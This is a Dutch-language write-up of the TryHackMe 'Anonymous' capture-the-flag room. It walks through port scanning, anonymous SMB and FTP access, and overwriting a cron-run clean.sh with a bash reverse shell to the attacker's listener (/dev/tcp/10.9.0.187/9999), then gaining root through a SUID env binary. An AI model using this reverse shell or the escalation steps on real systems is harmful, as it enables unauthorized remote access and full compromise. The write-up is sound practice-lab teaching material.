---
title: "Try Hack Me - Anonymous"
author: Nicolas Bouquiaux
date: "2021-03-27"
subject: "Markdown"
keywords: [Markdown, Example]
lang: "nl"
...

# Enumeration

## nmap

Zoals gewoonlijk, starten we bij het zoeken openstaande poorten op de target.

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/Anonymous]
└─# nmap -sS -sV $ip                                                                                                                      1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 19:34 EDT
Nmap scan report for 10.10.52.81
Host is up (0.037s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.15 seconds

```

De server draait samba-shares voor op het netwerk (139 / 445), aanvaard ook FTP-verbindingen en SSH-verbindingen.



## SMB

Eerst de service enumeraten voor te zien welke shares er precies zijn

```shell
──(root💀kali)-[~/CTF-Write-Ups/Anonymous]
└─# smbclient -L $ip                                                                                                                      1 ⚙
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Het is dus mogelijk om anoniem in te loggen via de SMB service. Verder blijkt er ook een share te zijn genaamd pics. Laat ik daar een kijkje in nemen:

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/Anonymous]
└─# smbclient //$ip/pics                                                                                                                  1 ⚙
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

		20508240 blocks of size 1024. 13306792 blocks available
smb: \> 
``` 

Een beetje vreemd om voor slechts 2 foto's een share aan te maken. De foto's hadden ook geen bestanden verborgen in de afbeeldingen zelf. 


## FTP

De server bleek ook FTP-verbindingen te aanvaarden, eens kijken of dit ook anonieme-logins toelaat:

```shell
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> 

```

Zo te zien kan dit je via FTP gewoonweg als anonieme gebruiker aanmelden. Een folder dat scripts word genoemd klinkt mij zeer interessant om te zien over welke scripts het hier allemaal gaat:

```shell
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         6579 Mar 28 00:05 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> 
```

Ok het is misschien maar 1 script met 2 bijhorende bestanden, jammer want ik dacht dat misschien ik deze scripts zelf kon gebruiken.

Het is best een goed moment om deze bestanden te downloaden naar onze machine:

```shell
ftp> get clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (152.9380 kB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (6751 bytes).
226 Transfer complete.
6751 bytes received in 0.00 secs (46.6540 MB/s)
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.07 secs (0.8933 kB/s)
ftp> 
```

## File Inspection

Ik dacht te beginnen bij het to_do-lijstje:

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/Anonymous/Retrieved_files]
└─# cat to_do.txt 
I really need to disable the anonymous login...it's really not safe
```

Daarin stond één taak. Wel op zen minst was de verantwoordelijke hiervan op de hoogte van een eventuele beveiligingsrisico voor de systemen die hij beheerd.

Dan maar eens kijken welk script hij gebruikte om het beheer wat te vereenvoudigen:

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/Anonymous/Retrieved_files]
└─# cat clean.sh 
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

``` 

Ok dus het script doet het volgende:

* Een variable van het aantal tmp_files word gedeclareerd en krijgt als waarde 0;
* Het script roept daarna de variabele weer op;
	* Op de waarde van de variabele wordt een if-else statement uitgevoerd;
	* Dat indien de waarde gelijk is aan 0, er een lijn weggeschreven wordt in het .log bestand om te melden dat er niets was om te deleten;

	* Indien er iets anders dan 0 werd teruggegeven, verwijdert het script de volledige lijn (waarschijnlijk bevat de lijn een path met repo's of dergelijke). Nadat heel de inhoud vanuit de collectie $LINE is verwijderd, schrijft hij in de .log een zin weg waarbij het bestand dat werd verwijderd in wordt vermeld alsmede de datum waarop het werd verwijderd.

Ik vermoed dat er cronjob op het systeem aanwezig is die het uitvoeren van dit script activeert.

Dat betekent dat we een reverse-shell script kunnen verbergen in het clean.sh script, dat bij het uitvoeren ons een shell geeft.


# Getting a shell

## Writing the script

Het script dat ik zal gebruiken om ons een shell te geven met het systeem ziet er uit als volgt:

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/Anonymous/exploits]
└─# cat clean.sh 
#!/bin/bash

bash -i >& /dev/tcp/10.9.0.187/9999 0>&1
```

## Uploading malicious script

Nu verbinden we weer met FTP om onze clean.sh up te loaden naar de server:

```shell
ftp> put clean.sh clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
55 bytes sent in 0.00 secs (852.5546 kB/s)
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000           55 Mar 28 01:01 clean.sh
-rw-rw-r--    1 1000     1000         8987 Mar 28 01:01 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

Na 5 minuten hadden we een shell-verbinding met het systeem.

```shell
┌──(root💀kali)-[~/CTF-Write-Ups/Anonymous]
└─# rlwrap nc -lnvp 9999              1 ⚙
listening on [any] 9999 ...
connect to [10.9.0.187] from (UNKNOWN) [10.10.52.81] 56428
bash: cannot set terminal process group (1950): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ 
```

# Privelege Escelation

## user flas


Nu even de user.txt zien te locaten:

```shell
ls -la
total 60
drwxr-xr-x 6 namelessone namelessone 4096 May 14  2020 .
drwxr-xr-x 3 root        root        4096 May 11  2020 ..
lrwxrwxrwx 1 root        root           9 May 11  2020 .bash_history -> /dev/null
-rw-r--r-- 1 namelessone namelessone  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 namelessone namelessone 3771 Apr  4  2018 .bashrc
drwx------ 2 namelessone namelessone 4096 May 11  2020 .cache
drwx------ 3 namelessone namelessone 4096 May 11  2020 .gnupg
-rw------- 1 namelessone namelessone   36 May 12  2020 .lesshst
drwxrwxr-x 3 namelessone namelessone 4096 May 12  2020 .local
drwxr-xr-x 2 namelessone namelessone 4096 May 17  2020 pics
-rw-r--r-- 1 namelessone namelessone  807 Apr  4  2018 .profile
-rw-rw-r-- 1 namelessone namelessone   66 May 12  2020 .selected_editor
-rw-r--r-- 1 namelessone namelessone    0 May 12  2020 .sudo_as_admin_successful
-rw-r--r-- 1 namelessone namelessone   33 May 11  2020 user.txt
```

Dat zo te zien niet echt verstopt in het systeem zat:


```shell
find / -name user.txt 2>/dev/null
/home/namelessone/user.txt
cat /home/namelessone/user.txt
cat /home/namelessone/user.txt
************************
```

## Root-flag

Het de meest gebruikte techniek om jezelf root permissies te geven, is door de GTFOBins die dit mogelijk maken. Deze techniek pas ik dan zelf ook toe.


```shell
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
```

/bin/env is de het eerste resultaat dat ik terugvond op de pagina van GTFOBins.


```shell
/usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
id
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
whoami
whoami
root
cat /root/root.txt
cat /root/root.txt
********************************
#
```

Wat dus het einde betekent voor zover deze CTF, en dit is persoonlijk al een tweede keer dat mijn methode voor Root te bekomen gerealiseerd werd m.b.v. de GTFOBins. 

